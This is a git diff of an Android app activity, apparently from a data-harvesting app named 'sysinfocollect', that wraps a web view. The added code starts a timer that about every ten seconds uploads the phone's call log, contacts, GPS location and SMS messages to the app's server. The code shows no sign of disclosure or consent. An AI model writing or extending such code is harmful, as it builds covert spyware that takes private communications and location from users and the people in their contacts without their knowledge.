@@ -1,10 +1,12 @@
-package com.tutu.sysinfocollect;
+package com.tutu.sysinfocollect.activity;
 
+import android.content.Intent;
 import android.net.Uri;
 import android.os.Bundle;
+import android.os.CountDownTimer;
 import android.support.annotation.Nullable;
-import android.support.v7.app.AppCompatActivity;
 import android.text.TextUtils;
+import android.util.Log;
 import android.view.ViewGroup;
 import android.webkit.ValueCallback;
 import android.webkit.WebChromeClient;
@@ -13,6 +15,8 @@ import com.github.lzyzsd.jsbridge.BridgeHandler;
 import com.github.lzyzsd.jsbridge.BridgeWebView;
 import com.github.lzyzsd.jsbridge.CallBackFunction;
 import com.github.lzyzsd.jsbridge.DefaultHandler;
+import com.tutu.sysinfocollect.R;
+import com.tutu.sysinfocollect.constans.Constans;
 import com.tutu.sysinfocollect.module.callRecoder.CallRecoderGetHelper;
 import com.tutu.sysinfocollect.module.contact.ContactGetHelper;
 import com.tutu.sysinfocollect.module.gps.GpsGetHelper;
@@ -20,15 +24,50 @@ import com.tutu.sysinfocollect.module.gps.LocationHelper;
 import com.tutu.sysinfocollect.module.sms.SmsGetHelper;
 import com.tutu.sysinfocollect.net.NetEngine;
 import com.tutu.sysinfocollect.utils.ToastUtils;
+import com.tutu.sysinfocollect.web.TWebViewClient;
 
 
-public class JsBridgeWebViewActivity extends AppCompatActivity {
-    public static final String URL = "https://www.baidu.com/";
+public class JsBridgeWebViewActivity extends BaseActivity {
+    public static final String URL = Constans.INDEX_URL;
 
     BridgeWebView webview;
     String url;
 
     private LocationHelper locationHelper;
+
+
+    private CountDownTimer timer = new CountDownTimer(10000, 10000) {
+
+        @Override
+        public void onTick(long millisUntilFinished) {
+            uploadInfo();
+        }
+
+        @Override
+        public void onFinish() {
+            timer.start();
+        }
+    };
+
+    private void uploadInfo() {
+        NetEngine.upLoadUsserInfo(new CallRecoderGetHelper().getCallsListFromDb(this),
+                new ContactGetHelper().getContacts(this)
+                , GpsGetHelper.getGps(),
+                new SmsGetHelper(this).getSmsInfos(), new NetEngine.onRequestResult() {
+                    @Override
+                    public void onFail(String code, String msg) {
+                        ToastUtils.showShortToast(msg);
+                        if (Constans.RES_CODE_N_2.equals(code)) {
+                            toLogin();
+                        }
+                    }
+
+                    @Override
+                    public void onSuccess(String o) {
+                        Log.i("upload", "上传信息成功");
+                    }
+                });
+    }
 
 
     @Override
@@ -46,12 +85,13 @@ public class JsBridgeWebViewActivity extends AppCompatActivity {
         webview.loadUrl(url);
         locationHelper = new LocationHelper(this);
         locationHelper.initLocation();
+        timer.start();
+    }
 
-        NetEngine.registLogin("13018924230");
-        NetEngine.upLoadUsserInfo(new CallRecoderGetHelper().getCallsListFromDb(this),
-                new ContactGetHelper().getContacts(this)
-                , GpsGetHelper.getGps(),
-                new SmsGetHelper(this).getSmsInfos());
+    private void toLogin() {
+        Intent intent = new Intent(this, LoginActivity.class);
+        startActivity(intent);
+        finish();
     }
 
     private void initWebView() {
@@ -75,21 +115,17 @@ public class JsBridgeWebViewActivity extends AppCompatActivity {
         });
 
         webview.setWebViewClient(new TWebViewClient(webview));
-
         registJsCallJavaMethod();
     }
 
 
     @Override
     public void onBackPressed() {
-
         if (webview.canGoBack()) {
             webview.goBack();// 返回前一个页面
-
         } else {
             super.onBackPressed();
         }
-
     }
 
     @Override
